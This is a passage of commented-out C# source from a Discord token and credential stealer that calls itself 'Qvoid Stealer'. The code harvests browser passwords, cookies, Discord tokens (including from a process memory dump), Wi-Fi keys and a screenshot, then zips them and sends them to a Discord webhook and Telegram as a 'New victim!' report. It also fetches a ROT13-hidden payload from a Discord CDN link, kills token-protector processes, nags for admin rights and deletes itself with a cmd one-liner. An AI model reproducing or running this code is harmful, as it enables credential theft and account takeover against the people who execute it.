//                fields.Add(new EmbedField() { Name = "IP Address", Value = $"```{machine.PublicIPv4}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "LAN Address", Value = $"```{machine.LanIPv4}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "Desktop Username", Value = $"```{Environment.UserName}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "Domain Username", Value = $"```{Environment.UserDomainName}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "Processor Count", Value = $"```{Environment.ProcessorCount}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "Memory", Value = $"```{machine.PcMemory}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "OS Architecture", Value = $"```{machine.OsArchitecture}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "GPU Video", Value = $"```{machine.GpuVideo}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "GPU Version", Value = $"```{machine.GpuVersion}```", InLine = true });
//                fields.Add(new EmbedField() { Name = "Windows License", Value = $"```{machine.WindowsLicense}```", InLine = true });

//                string BodyMessage = "";
//                string HeadMessage = $"*IP Address*{Environment.NewLine}  > {machine.PublicIPv4}{Environment.NewLine}" +
//                                     $"*LAN Address*{Environment.NewLine}  > {machine.LanIPv4}{Environment.NewLine}" +
//                                     $"*Desktop Username*{Environment.NewLine}  > {Environment.UserName}{Environment.NewLine}" +
//                                     $"*Domain Username*{Environment.NewLine}  > {Environment.UserDomainName}{Environment.NewLine}" +
//                                     $"*Processor Count*{Environment.NewLine}  > {Environment.ProcessorCount}{Environment.NewLine}" +
//                                     $"*Memory*{Environment.NewLine}  > {machine.PcMemory}{Environment.NewLine}" +
//                                     $"*OS Architecture*{Environment.NewLine}  > {machine.GpuVideo}{Environment.NewLine}" +
//                                     $"*GPU Video*{Environment.NewLine}  > {machine.LanIPv4}{Environment.NewLine}" +
//                                     $"*GPU Version*{Environment.NewLine}  > {machine.GpuVersion}{Environment.NewLine}" +
//                                     $"*Windows License*{Environment.NewLine}  > {machine.WindowsLicense}{Environment.NewLine}";

//                string Passwords = "------ Passwords ------";
//                string Cookies = "------ Cookies ------";

//                //Grabbing passwords and cookies
//                var _Chrome = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
//                    "\\Google\\Chrome\\User Data\\Default\\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
//                    "\\Google\\Chrome\\User Data\\Local State", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
//                    "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome");

//                var _Brave = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
//                    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
//                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
//                    "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
//                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
//                    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "Brave");

//                var _Opera = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
//                    "\\Opera Software\\Opera GX Stable\\Cookies",
//                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
//                    "\\Opera Software\\Opera GX Stable\\Local State",
//                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
//                    "\\Opera Software\\Opera GX Stable\\Login Data", "Opera");

//                var GeckoPasswords = GeckoGrabber.Passwords.GetAll();
//                var GeckoCookies = GeckoGrabber.Cookies.GetAll();

//                #region Passwords
//                // ----------------------- Passwords -----------------------//

//                var ChromePasswords = _Chrome.ReadPasswords();
//                if (ChromePasswords != null && ChromePasswords.Count > 0)
//                    Passwords += ChromePasswords.ToString("Chrome");

//                var OperaPasswords = _Opera.ReadPasswords();
//                if (OperaPasswords != null && OperaPasswords.Count > 0)
//                    Passwords += OperaPasswords.ToString("OperaGx");

//                var BravePasswords = _Brave.ReadPasswords();
//                if (BravePasswords != null && BravePasswords.Count > 0)
//                    Passwords += BravePasswords.ToString("Brave");

//                if (!String.IsNullOrEmpty(GeckoPasswords) && !String.IsNullOrWhiteSpace(GeckoPasswords))
//                    Passwords += GeckoPasswords;

//                #endregion Passwords

//                #region Cookies
//                // ----------------------- Cookies -----------------------//

//                var ChromeCookies = _Chrome.GetCookies();
//                if (ChromeCookies != null && ChromeCookies.Count > 0)
//                    Cookies += ChromeCookies.ToString("Chrome");

//                var OperaCookies = _Opera.GetCookies();
//                if (OperaCookies != null && OperaCookies.Count > 0)
//                    Cookies += OperaCookies.ToString("OpearaGx");

//                var BraveCookies = _Brave.GetCookies();
//                if (BraveCookies != null && BraveCookies.Count > 0)
//                    Cookies += BraveCookies.ToString("Brave");

//                if (!String.IsNullOrEmpty(GeckoCookies) && !String.IsNullOrWhiteSpace(GeckoCookies))
//                    Cookies += GeckoCookies;
//                #endregion Cookies

//                //Loop over all the grabbed tokens.
//                for (int i = 0; i < Tokens.Count; ++i)
//                {
//                    DiscordClient curUser = Tokens[i];

//                    //Checking for duplicates (We cannot use Distinct() because there might be multiple tokens to the same account)
//                    bool duplicate = false;
//                    foreach (var user in Users)
//                    {
//                        if (user == null)
//                            continue;

//                        if (curUser.Id == user.Id)
//                        {
//                            duplicate = true;
//                            break;
//                        }
//                    }

//                    if (duplicate)
//                        continue;

//                    Users.Add(curUser);

//                    //Writing the message which contains the Discord Client information.
//                    string userData = $"Username: {curUser.Username}#{curUser.Discriminator}{Environment.NewLine}" +
//                                      $"Email: {(String.IsNullOrEmpty(curUser.Email) ? "None" : curUser.Email)}{Environment.NewLine}" +
//                                      $"Phone Number: {(String.IsNullOrEmpty(curUser.Phone) ? "None" : curUser.Phone)}{Environment.NewLine}" +
//                                      $"Premium: {curUser.Premium}{Environment.NewLine}" +
//                                      $"Verified: {curUser.Verified}{Environment.NewLine}" +
//                                      $"Created At: {curUser.CreatedAt.DateTime.ToShortDateString()} | {curUser.CreatedAt.DateTime.ToShortTimeString()}{Environment.NewLine}";

//                    if (_Token == curUser.Token)
//                    {
//                        victimEmbed.Author = new EmbedAuthor()
//                        {
//                            Name = "Logged user information"
//                        };
//                        victimEmbed.Fields = new List<EmbedField>();
//                        victimEmbed.Fields.Add(new EmbedField() { Name = "Username", Value = $"```{curUser.Username}#{curUser.Discriminator}```", InLine = true });
//                        victimEmbed.Fields.Add(new EmbedField() { Name = "Id", Value = $"```{curUser.Id}```", InLine = true });
//                        victimEmbed.Fields.Add(new EmbedField() { Name = "Verified", Value = $"```{curUser.Verified}```", InLine = true });
//                        victimEmbed.Fields.Add(new EmbedField() { Name = "Created At", Value = $"```{curUser.CreatedAt}```", InLine = true });
//                        victimEmbed.Fields.Add(new EmbedField() { Name = "Phone Number", Value = $"```{(String.IsNullOrEmpty(curUser.Phone) ? "None" : curUser.Phone)}{Environment.NewLine}```", InLine = true });

//                        if (!String.IsNullOrEmpty(_OldPassword))
//                        {
//                            userData += $"Old Password: {_OldPassword}{Environment.NewLine}";
//                            victimEmbed.Fields.Add(new EmbedField() { Name = "Old Password", Value = $"```{_OldPassword}```", InLine = false });
//                        }

//                        if (!String.IsNullOrEmpty(_NewPassword))
//                        {
//                            userData += $"Current Password: {_NewPassword}{Environment.NewLine}";
//                            victimEmbed.Fields.Add(new EmbedField() { Name = "Current Password", Value = $"```{_NewPassword}```", InLine = false });
//                        }

//                        victimEmbed.Fields.Add(new EmbedField() { Name = "Token", Value = $"```{_Token}```", InLine = false });
//                    }
//                    else
//                    {
//                        victimEmbed.Author = new EmbedAuthor()
//                        {
//                            Name = "First time opening grabber ... next time we'll have the password.",
//                            Url = "https://www.youtube.com/c/LastDude/videos" //Some credit for LastDude for the music which I heard most of the time I coded this project.
//                        };
//                    }

//                    userData += $"Token: {curUser.Token}{Environment.NewLine}";
//                    usersData.Add(userData);
//                    BodyMessage += $"{Environment.NewLine}Username```{curUser.Username}#{curUser.Discriminator}```" +
//                                   $"{Environment.NewLine}Email```{curUser.Email}```" +
//                                   $"{Environment.NewLine}Phone Number```{curUser.Phone}```" +
//                                   $"{Environment.NewLine}Premium```{curUser.Premium}```" +
//                                   $"{Environment.NewLine}Token```{curUser.Token}```";
//                }

//                //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
//                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 19)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 21)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 22)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 23)}-{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 24)}.dat";
//                if (!File.Exists(usersPath) || (Encryption.ComputeSha256Hash(Other.Sort(HeadMessage + BodyMessage).Replace(Environment.NewLine, "")) != File.ReadAllText(usersPath)))
//                {
//                    //Writing the log file.
//                    File.WriteAllText(usersPath, Encryption.ComputeSha256Hash(Other.Sort(HeadMessage + BodyMessage).Replace(Environment.NewLine, "")));
//                    var filesDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BleachBit\\bin\\";
//                    if (Directory.Exists(filesDir))
//                        Directory.Delete(filesDir, true);

//                    Directory.CreateDirectory(filesDir);

//                    if (Passwords != "------ Passwords ------")
//                        File.WriteAllText(filesDir + "\\BrowserPasswords.txt", Passwords);

//                    if (Cookies != "------ Cookies ------")
//                        File.WriteAllText(filesDir + "\\BrowserCookies.txt", Cookies);

//                    if (usersData.Count > 0)
//                    {
//                        File.WriteAllText(filesDir + "\\RawTokens.txt", string.Join(Environment.NewLine, Users.Select(t => t.Token)));
//                        File.WriteAllText(filesDir + "\\TokensInformation.txt", string.Join($"{Environment.NewLine}-----------------------------------------------------{Environment.NewLine}", usersData));
//                    }

//                    WirelessLan lan = new WirelessLan();
//                    if (lan.IsAvailable)
//                    {
//                        string content = "";
//                        foreach (var ssid in lan.SSIDs)
//                            content += $"{ssid.Profile.Name}:{ssid.Security.Key}{Environment.NewLine}";

//                        if (!string.IsNullOrEmpty(content))
//                            File.WriteAllText(filesDir + "\\Lan.txt", content);
//                    }

//                    using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
//                    {
//                        try
//                        {
//                            using (Graphics g = Graphics.FromImage(bmp))
//                                g.CopyFromScreen(SystemInformation.VirtualScreen.Left, SystemInformation.VirtualScreen.Top, 0, 0, bmp.Size);

//                            bmp.Save($"{filesDir}\\Screenshot.jpg", ImageFormat.Jpeg);
//                        }
//                        catch { }
//                    }

//                    var finalZip = $"{Path.GetTempPath()}\\{Environment.UserDomainName}-REPORT.zip";
//                    if (File.Exists(finalZip))
//                        File.Delete(finalZip);

//                    ZipFile.CreateFromDirectory(filesDir, finalZip);
//                    if (Settings.Telegram != null)
//                        Settings.Telegram.Send(File.ReadAllBytes(finalZip), $"{Environment.UserDomainName}-REPORT.zip", HeadMessage);

//                    victimEmbed.Color = Other.Spectrum(0);

//                    Settings.Webhook.Send(new DiscordMessage()
//                    {
//                        Embeds = new List<DiscordEmbed>()
//                        {
//                            new DiscordEmbed()
//                            {
//                                Footer = new EmbedFooter
//                                {
//                                    Text = "Enum0x539/Qvoid-Token-Grabber",
//                                },
//                                Timestamp = DateTime.UtcNow,
//                                Color = Other.Spectrum(0),
//                                Fields = fields,
//                                Title = "New victim!",
//                            },
//                            victimEmbed
//                        },
//                        Username = "Qvoid Stealer",
//                        AvatarUrl = "https://cdn.discordapp.com/attachments/827625760843235368/936248839956996116/unknown.png"
//                    },
//                    new FileInfo[] { new FileInfo(finalZip) });
//                }
//            }
//        }

//        /// <summary>
//        /// Extracts the grabber dependencies to the destination directory.
//        /// </summary>
//        /// <param name="Path"></param>
//        /// <param name="Destination"></param>
//        static public void Extract(string Path, string Destination)
//        {
//            Directory.CreateDirectory(Path);

//            FileInfo info = new FileInfo(Path + "Release.zip");
//            string _link = Encryption.ROT13("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/827625760843235368/942786364246736907/Eryrnfr.mvc");

//            if (!info.Exists)
//            {
//                //Downloads the dependencies if they don't exists.
//                using (WebClient wc = new WebClient())
//                    wc.DownloadFile(_link, Path + "Release.zip");
//            }
//            else
//            {
//                //Verifing the file (you can use SHA256CheckSum), if not valid we install the dependencies.
//                if (info.Length <= 5300)
//                    using (WebClient wc = new WebClient())
//                        wc.DownloadFile(_link, Path + "Release.zip");
//            }

//            try
//            {
//                //Extracts the ZIP content (dependencies) to the destination directory.
//                ZipFile.ExtractToDirectory(Path + "Release.zip", Destination);
//            }
//            catch
//            { }
//        }

//        /// <summary>
//        /// Deletes all the files and traces created by the grabber.
//        /// </summary>
//        static public void DeleteTraces(bool DeleteRecursive = false, bool Destruct = true)
//        {
//            try
//            {
//                string path = Path.GetTempPath() + $"\\{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 10)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 11)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 12)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 13)}-{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 14)}\\";
//                if (Directory.Exists(path))
//                    Directory.Delete(path, true);
//            }
//            catch (Exception ex) { Debug.WriteLine("Error occured while deleting the main Path;" + ex.Message); }

//            if (DeleteRecursive)
//            {
//                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 20)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 21)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 22)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 23)}-{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 24)}.dat";
//                if (File.Exists(usersPath))
//                {
//                    try { File.Delete(usersPath); }
//                    catch (Exception ex) { Debug.WriteLine("Error occured while deleting the log file;" + ex.Message); }
//                }
//            }

//            if (Destruct)
//            {
//                string app = AppDomain.CurrentDomain.FriendlyName;
//                string AppPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString() + $@"\{app}";

//                ProcessStartInfo startInfo = new ProcessStartInfo();
//                startInfo.CreateNoWindow = true;
//                startInfo.UseShellExecute = false;
//                startInfo.FileName = "cmd.exe";
//                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
//                startInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del " + AppPath;
//                Process.Start(startInfo);

//                Process.GetCurrentProcess().Kill();
//            }
//        }

//        /// <summary>
//        /// Finds all the Discord's token(s) available on the local computer.
//        /// </summary>
//        /// <param name="TokensLocation"></param>
//        /// <returns>tokens located on the local computer</returns>
//        static private List<DiscordClient> FindTokens(List<string> TokensLocation, string FileName)
//        {
//            string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
//            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
//            string _DiscordExe = FileName;

//            //Adding known possible tokens paths.
//            TokensLocation.Add(localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
//            TokensLocation.Add(localAppdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
//            TokensLocation.Add(localAppdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
//            TokensLocation.Add(localAppdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Lightcord\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Amigo\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Torch\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Kometa\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Orbitum\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\CentBrowser\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
//            TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");

//            List<DiscordClient> clients = new List<DiscordClient>();
//            List<string> tokens = new List<string>();

//            Thread FireFoxBased = new Thread(() =>
//            {
//                List<string> FireFoxBasedLocation = new List<string>();
//                List<Thread> Threads = new List<Thread>();

//                FireFoxBasedLocation.Add(roaming + "\\Mozilla\\Firefox\\Profiles");
//                FireFoxBasedLocation.Add(roaming + "\\Waterfox\\Profiles");
//                FireFoxBasedLocation.Add(roaming + "\\Moonchild Productions\\Pale Moon\\Profiles");

//                foreach (var tokenPath in FireFoxBasedLocation)
//                {
//                    if (!Directory.Exists(tokenPath))
//                        continue;

//                    Thread.Sleep(1);
//                    Thread _t = new Thread(() =>
//                    {
//                        //FireFox needs to be threat in special way ;(
//                        foreach (var directory in Directory.GetDirectories(tokenPath))
//                        {
//                            var files = Directory.GetFiles(directory);
//                            foreach (var file in files)
//                            {
//                                while (true)
//                                {
//                                    if (!file.EndsWith(".sqlite"))
//                                        break;

//                                    try
//                                    {
//                                        string fileContent = "";

//                                        //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
//                                        using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
//                                        using (StreamReader sr = new StreamReader(fs))
//                                            fileContent = sr.ReadToEnd();

//                                        MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
//                                        MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}", RegexOptions.Compiled);

//                                        foreach (Match match in matches)
//                                        {
//                                            if (tokens.Contains(match.Value))
//                                                continue;

//                                            try
//                                            {
//                                                DiscordClient client = new DiscordClient(match.Value);
//                                                if (client.IsValidToken)
//                                                {
//                                                    clients.Add(client);
//                                                    tokens.Add(match.Value);
//                                                }
//                                            }
//                                            catch (Exception ex)
//                                            {
//                                                if (ex.Message.Contains("Invaild token."))
//                                                    continue;
//                                            }
//                                        }

//                                        foreach (Match match in mfaMatches)
//                                        {
//                                            if (tokens.Contains(match.Value))
//                                                continue;

//                                            try
//                                            {
//                                                DiscordClient client = new DiscordClient(match.Value);
//                                                if (client.IsValidToken)
//                                                {
//                                                    clients.Add(client);
//                                                    tokens.Add(match.Value);
//                                                }
//                                            }
//                                            catch (Exception ex)
//                                            {
//                                                if (ex.Message.Contains("Invaild token."))
//                                                    continue;
//                                            }
//                                        }

//                                        break;
//                                    }
//                                    catch (Exception)
//                                    {
//                                        foreach (var locker in ProcessHandler.WhoIsLocking(file))
//                                        {
//                                            try
//                                            {
//                                                if (locker.MainModule.FileName == _DiscordExe)
//                                                    continue;
//                                            }
//                                            catch (Exception)
//                                            { }

//                                            try { locker.Kill(); }
//                                            catch { break; }
//                                        }
//                                    }
//                                }
//                            }
//                        }
//                    });

//                    Threads.Add(_t);
//                    _t.Start();
//                }

//                Thread.Sleep(150);
//                while (true)
//                {
//                    Thread.Sleep(1);

//                    foreach (var t in Threads.ToList())
//                    {
//                        if (!t.IsAlive)
//                            Threads.Remove(t);
//                    }

//                    if (Threads.ToList().Count == 0)
//                        break;
//                }
//            });

//            Thread Main = new Thread(() =>
//            {
//                foreach (var tokenPath in TokensLocation)
//                {
//                    if (!Directory.Exists(tokenPath))
//                        continue;

//                    foreach (string filePath in Directory.GetFiles(tokenPath))
//                    {
//                        while (true)
//                        {
//                            if (!filePath.EndsWith(".log") && !filePath.EndsWith(".ldb"))
//                                break;

//                            try
//                            {
//                                string fileContent = "";

//                                //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
//                                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
//                                using (StreamReader sr = new StreamReader(fs))
//                                    fileContent = sr.ReadToEnd();

//                                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
//                                MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}", RegexOptions.Compiled);

//                                foreach (Match match in matches)
//                                {
//                                    if (tokens.Contains(match.Value))
//                                        continue;

//                                    try
//                                    {
//                                        DiscordClient client = new DiscordClient(match.Value);
//                                        if (client.IsValidToken)
//                                        {
//                                            clients.Add(client);
//                                            tokens.Add(match.Value);
//                                        }
//                                    }
//                                    catch (Exception ex)
//                                    {
//                                        if (ex.Message.Contains("Invaild token."))
//                                            continue;
//                                    }
//                                }

//                                foreach (Match match in mfaMatches)
//                                {
//                                    if (tokens.Contains(match.Value))
//                                        continue;

//                                    try
//                                    {
//                                        DiscordClient client = new DiscordClient(match.Value);
//                                        if (client.IsValidToken)
//                                        {
//                                            clients.Add(client);
//                                            tokens.Add(match.Value);
//                                        }
//                                    }
//                                    catch (Exception ex)
//                                    {
//                                        if (ex.Message.Contains("Invaild token."))
//                                            continue;
//                                    }
//                                }

//                                break;
//                            }
//                            catch (Exception)
//                            {
//                                foreach (var locker in ProcessHandler.WhoIsLocking(filePath))
//                                {
//                                    try
//                                    {
//                                        if (locker.MainModule.FileName == _DiscordExe)
//                                            continue;
//                                    }
//                                    catch (Exception)
//                                    { }

//                                    try { locker.Kill(); }
//                                    catch { break; }
//                                }
//                            }
//                        }
//                    }
//                }
//            });

//            Main.Start();
//            FireFoxBased.Start();

//            while (Main.IsAlive || FireFoxBased.IsAlive)
//                Thread.Sleep(5);

//            return clients;
//        }
//    }

//    /// <summary>
//    /// Contains everything releated to the Discord process. 
//    /// </summary>
//    public class Discord
//    {
//        public List<string> TokensPaths { get; } = new List<string>();
//        public List<string> Voices { get; } = new List<string>();
//        public List<string> Cores { get; } = new List<string>();
//        public List<DiscordClient> DumpedClients { get; private set; } = new List<DiscordClient>();
//        public List<string> DumpedTokens { get; private set; } = new List<string>();

//        public bool IsExists { get; private set; }
//        public Version Version { get; }
//        public string Name { get; }
//        public FileInfo FileInfo { get; }
//        public List<Process> Processes { get; }

//        [DllImport("dbghelp.dll", SetLastError = true)]
//        static extern bool MiniDumpWriteDump(IntPtr hProcess, UInt32 ProcessId, SafeHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

//        /// <summary>
//        /// The constructor will find us all the information we need about the client and possible tokens location.
//        /// </summary>
//        public Discord()
//        {
//            this.Processes = Process.GetProcessesByName("discord").ToList();
//            Voices = new List<string>();
//            Cores = new List<string>();
//            TokensPaths = new List<string>();

//            var directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
//            foreach (var directory in directories)
//            {
//                if (directory.ToLower().Contains("discord"))
//                {
//                    var core = Directory.GetFiles(directory, "core.asar", SearchOption.AllDirectories);
//                    var index = Directory.GetFiles(directory, "index.js", SearchOption.AllDirectories);
//                    var discord_exe = Directory.GetFiles(directory, "Discord.exe", SearchOption.AllDirectories);
//                    var capture_exe = Directory.GetFiles(directory, "capture_helper.exe", SearchOption.AllDirectories);

//                    foreach (var coreFile in core)
//                        foreach (var indexFile in index)
//                            if (coreFile.Replace("core.asar", "") == indexFile.Replace("index.js", ""))
//                                Cores.Add(coreFile.Replace("core.asar", ""));

//                    foreach (var capture in capture_exe)
//                        foreach (var indexFile in index)
//                            if (capture.Replace("capture_helper.exe", "") == indexFile.Replace("index.js", ""))
//                                Voices.Add(capture.Replace("capture_helper.exe", ""));

//                    foreach (var file in discord_exe)
//                    {
//                        FileInfo info = new FileInfo(file);
//                        if (info.Length > 60000)
//                        {
//                            var objInfo = FileVersionInfo.GetVersionInfo(file);
//                            if (objInfo.LegalCopyright == "Copyright (c) 2021 Discord Inc. All rights reserved.")
//                            {
//                                if (objInfo.FileName.EndsWith("Discord.exe"))
//                                {
//                                    foreach (var proc in Processes.ToList())
//                                    {
//                                        if (proc.MainModule.FileName != objInfo.FileName)
//                                            Processes.Remove(proc);
//                                    }

//                                    if (Processes.ToList().First().MainModule.FileName == objInfo.FileName)
//                                    {
//                                        FileInfo = new FileInfo(Processes.First().MainModule.FileName);
//                                        Name = Processes.First().MainModule.FileName;
//                                        Version = new Version(objInfo.FileVersion);
//                                    }
//                                    break;
//                                }
//                            }
//                        }
//                    }
//                }
//            }

//            this.IsExists = FileInfo.Exists;

//            directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
//            foreach (var directory in directories)
//            {
//                if (directory.ToLower().Contains("discord"))
//                {
//                    var subDirectories = Directory.GetDirectories(directory);
//                    foreach (var localDirectory in subDirectories)
//                    {
//                        if (localDirectory.Contains("Local Storage"))
//                        {
//                            var temp = Directory.GetDirectories(localDirectory);
//                            foreach (var item in temp)
//                                if (item.Contains("leveldb"))
//                                    TokensPaths.Add($"{item}\\");
//                        }
//                    }
//                }
//            }

//            if (TokensPaths.Count == 0)
//            {
//                if (File.Exists(Name.Replace("Discord.exe", "") + "resources\\tmp\\common\\paths.js"))
//                {
//                    var newLocation_tray = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tray-connected.png", SearchOption.AllDirectories);
//                    var newLocation_Transport = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "badge-11.ico", SearchOption.AllDirectories);
//                    foreach (var _file in newLocation_tray)
//                    {
//                        foreach (var __file in newLocation_Transport)
//                        {
//                            if (_file.Replace("tray-connected.png", "") == __file.Replace("badge-11.ico", ""))
//                            {
//                                if (Directory.Exists(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb"))
//                                    TokensPaths.Add(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb");
//                            }
//                        }
//                    }
//                }
//            }
//        }

//        /// <summary>
//        /// Dumping tokens from the process and check them.
//        /// </summary>
//        public void Dump()
//        {
//            List<DiscordClient> clients = new List<DiscordClient>();
//            List<string> tokens = new List<string>();

//            foreach (Process proid in Process.GetProcessesByName("discord"))
//            {
//                uint ProcessId = (uint)proid.Id;
//                IntPtr hProcess = proid.Handle;
//                string dumpPath = Path.GetTempPath() + $"\\Report28251213-{DateTime.UtcNow.Ticks % 50000}.log";
//                using (FileStream procdumpFileStream = File.Create(dumpPath))
//                    MiniDumpWriteDump(hProcess, ProcessId, procdumpFileStream.SafeFileHandle, 0x2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

//                string fileContent = File.ReadAllText(dumpPath);

//                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
//                MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}", RegexOptions.Compiled);

//                foreach (Match match in matches)
//                {
//                    if (tokens.Contains(match.Value))
//                        continue;

//                    try
//                    {
//                        DiscordClient client = new DiscordClient(match.Value);
//                        if (client.IsValidToken)
//                        {
//                            clients.Add(client);
//                            tokens.Add(match.Value);
//                        }
//                    }
//                    catch (Exception ex)
//                    {
//                        if (ex.Message.Contains("Invaild token."))
//                            continue;
//                    }
//                }

//                foreach (Match match in mfaMatches)
//                {
//                    if (tokens.Contains(match.Value))
//                        continue;

//                    try
//                    {
//                        DiscordClient client = new DiscordClient(match.Value);
//                        if (client.IsValidToken)
//                        {
//                            clients.Add(client);
//                            tokens.Add(match.Value);
//                        }
//                    }
//                    catch (Exception ex)
//                    {
//                        if (ex.Message.Contains("Invaild token."))
//                            continue;
//                    }
//                }


//                File.Delete(dumpPath);
//            }

//            DumpedClients.AddRange(clients);
//            DumpedTokens.AddRange(tokens);

//            DumpedClients = DumpedClients.Distinct().ToList();
//            DumpedTokens = DumpedTokens.Distinct().ToList();
//        }

//        /// <summary>
//        /// Bypassing known token protectors and replacing the protectors with the grabber ^^.
//        /// </summary>
//        public void BypassProtectors(string Path)
//        {
//            List<Protector> protectors = new List<Protector>()
//            {
//                new Protector()
//                {
//                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector",
//                    Name = "DiscordTokenProtector"
//                },
//                new Protector()
//                {
//                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\DTP_WindowsInstaller",
//                    Name = "DiscordTokenProtector"
//                },
//            };

//            foreach (var protector in protectors)
//            {
//                var process = Process.GetProcessesByName(protector.Name);
//                if (process.Length > 0)
//                {
//                    foreach (var proc in process)
//                    {
//                        //Terminating the protector
//                        try { proc.Kill(); }
//                        catch (Exception ex)
//                        {
//                            if (ex.Message.Contains("Access"))
//                            {
//                                if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
//                                {
//                                    //Could not terminate the protector because it has higher privileges.
//                                    using (Process newProc = new Process())
//                                    {
//                                        while (true)
//                                        {
//                                            try
//                                            {
//                                                newProc.StartInfo.FileName = Application.ExecutablePath;
//                                                newProc.StartInfo.CreateNoWindow = true;
//                                                newProc.StartInfo.UseShellExecute = true;
//                                                newProc.StartInfo.Verb = "runas";
//                                                newProc.Start();

//                                                break;
//                                            }
//                                            catch (Exception)
//                                            { continue; }
//                                        }
//                                    }
//                                }
//                            }
//                        }

//                        try
//                        {
